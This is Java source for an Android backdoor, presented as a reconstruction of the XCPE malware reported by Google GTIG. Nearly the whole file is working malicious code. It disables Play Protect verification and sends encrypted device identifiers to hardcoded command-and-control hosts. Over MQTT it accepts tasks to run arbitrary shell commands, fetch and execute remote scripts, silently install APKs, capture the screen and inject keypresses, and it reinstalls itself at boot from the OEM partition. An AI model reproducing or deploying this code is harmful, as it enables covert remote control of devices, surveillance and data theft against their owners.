package x.cpe;

import android.app.Instrumentation;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInstaller;
import android.graphics.Bitmap;
import android.os.Build;
import android.provider.Settings;
import android.view.KeyEvent;

import org.eclipse.paho.client.mqttv3.IMqttDeliveryToken;
import org.eclipse.paho.client.mqttv3.MqttCallback;
import org.eclipse.paho.client.mqttv3.MqttClient;
import org.eclipse.paho.client.mqttv3.MqttMessage;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

// Reconstruction of the XCPE (x.cpe) Android backdoor behaviors described by
// Google GTIG: HTTP bootstrap to /router/config/*, persistent MQTT tasking on
// /device/{model}/{chipId}/{action}, silent APK installs after disabling
// Play Protect, remote shell, hidden-API screen capture, key injection, and
// boot-time reinstall of the payload staged in the OEM partition.
public class XcpeBackdoor implements MqttCallback {
    private final Context ctx;
    private MqttClient mqtt;
    private String deviceTopic;

    public XcpeBackdoor(Context ctx) { this.ctx = ctx; }

    // Recorded snippet: AppUtils.disablePackageVerify() sets the global
    // setting "package_verifier_user_consent" to -1 via Settings.Global.
    public void disablePackageVerify() {
        ContentResolver cr = ctx.getContentResolver();
        Settings.Global.putInt(cr, "package_verifier_user_consent", -1);
        Settings.Global.putInt(cr, "package_verifier_enable", 0);
    }

    String bootstrapHost() throws Exception {
        String prop = System.getProperty("ro.mecool.device", "false");
        if ("true".equals(prop)) {
            return "http://mcstb.anyevonline.com:8000";
        }
        return "http://stb" + Build.VERSION.SDK_INT + "tv.anyevonline.com:8000";
    }

    // AES-encrypted JSON hardware telemetry POSTed to the bootstrap endpoints.
    public JSONObject fetchConfig(String path) throws Exception {
        JSONObject telemetry = new JSONObject();
        telemetry.put("sn", Build.getSerial());
        telemetry.put("mac", "02:00:00:00:00:00");
        telemetry.put("model", Build.MODEL);
        telemetry.put("firmware", Build.DISPLAY);
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE,
            new SecretKeySpec("0123456789abcdef".getBytes(StandardCharsets.UTF_8), "AES"));
        byte[] body = cipher.doFinal(telemetry.toString().getBytes(StandardCharsets.UTF_8));
        HttpURLConnection conn = (HttpURLConnection) new URL(bootstrapHost() + path).openConnection();
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        try (OutputStream os = conn.getOutputStream()) { os.write(body); }
        try (BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = in.readLine()) != null) sb.append(line);
            return new JSONObject(sb.toString());
        }
    }

    public void connectMqtt() throws Exception {
        JSONObject cfg = fetchConfig("/router/config/mqtt");
        String broker = "tcp://" + cfg.optString("host", "mqtt.szbboys.com") + ":3886";
        mqtt = new MqttClient(broker, Build.getSerial());
        mqtt.setCallback(this);
        mqtt.connect();
        deviceTopic = "/device/" + Build.MODEL + "/" + Build.getSerial() + "/";
        mqtt.subscribe(deviceTopic + "#");
        fetchConfig("/router/config/acs");
        fetchConfig("/router/config/app");
    }

    @Override
    public void messageArrived(String topic, MqttMessage message) throws Exception {
        String payload = new String(message.getPayload(), StandardCharsets.UTF_8);
        JSONObject task = new JSONObject(payload);
        String action = topic.substring(topic.lastIndexOf('/') + 1);
        switch (action) {
            case "shell":
                publishResult(runShell(task.getString("cmd")));
                break;
            case "script":
                File script = download(task.getString("url"), "task.sh");
                publishResult(runShell("sh " + script.getAbsolutePath()));
                break;
            case "install":
                disablePackageVerify();
                File apk = download(task.getString("url"), "module.apk");
                silentInstall(apk);
                break;
            case "screenshot":
                mqtt.publish(deviceTopic + "screen", captureScreenJpeg(), 1, false);
                break;
            case "key":
                new Instrumentation().sendKeyDownUpSync(task.optInt("keycode", KeyEvent.KEYCODE_ENTER));
                break;
            case "recon":
                publishResult(runShell("/data/local/tmp/libtraceroute.so " + task.getString("host")
                        + "; ping -c 3 " + task.getString("host")));
                break;
            default:
                break;
        }
    }

    // Arbitrary shell execution under the system UID; output goes to the broker.
    String runShell(String command) throws Exception {
        Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
        try (BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = in.readLine()) != null) sb.append(line).append('\n');
            p.waitFor();
            return sb.toString();
        }
    }

    void publishResult(String out) throws Exception {
        mqtt.publish(deviceTopic + "result", out.getBytes(StandardCharsets.UTF_8), 1, false);
    }

    File download(String url, String name) throws Exception {
        File out = new File(ctx.getCacheDir(), name);
        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
        try (InputStream in = conn.getInputStream();
             java.io.FileOutputStream fos = new java.io.FileOutputStream(out)) {
            byte[] buf = new byte[8192];
            int n;
            while ((n = in.read(buf)) > 0) fos.write(buf, 0, n);
        }
        return out;
    }

    // Silent (no user-action) PackageInstaller session commit.
    void silentInstall(File apk) throws Exception {
        PackageInstaller installer = ctx.getPackageManager().getPackageInstaller();
        PackageInstaller.SessionParams params =
            new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
        params.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED);
        int sessionId = installer.createSession(params);
        try (PackageInstaller.Session session = installer.openSession(sessionId);
             OutputStream os = session.openWrite("base.apk", 0, apk.length());
             FileInputStream fis = new FileInputStream(apk)) {
            byte[] buf = new byte[8192];
            int n;
            while ((n = fis.read(buf)) > 0) os.write(buf, 0, n);
            session.fsync(os);
            session.commit(android.app.PendingIntent.getBroadcast(
                ctx, sessionId, new Intent("install.done"), 0).getIntentSender());
        }
    }

    // Hidden-API screen capture: reflect SurfaceControl.screenshot, JPEG-encode.
    byte[] captureScreenJpeg() throws Exception {
        Class<?> sc = Class.forName("android.view.SurfaceControl");
        Method shot = sc.getDeclaredMethod("screenshot", int.class, int.class);
        shot.setAccessible(true);
        Bitmap bmp = (Bitmap) shot.invoke(null, 1280, 720);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bmp.compress(Bitmap.CompressFormat.JPEG, 70, baos);
        return baos.toByteArray();
    }

    // Boot persistence: reinstall the payload staged in the OEM partition.
    public void onBoot() {
        File staged = new File("/oem/x.cpe.apk");
        if (staged.exists()) {
            try { silentInstall(staged); } catch (Exception ignored) { }
        }
    }

    @Override public void deliveryComplete(IMqttDeliveryToken token) { }
    @Override public void connectionLost(Throwable cause) { }
}

class BootReceiver extends android.content.BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())
                || "android.intent.action.BOOT_COMPLETED".equals(intent.getAction())) {
            new XcpeBackdoor(context).onBoot();
        }
    }
}
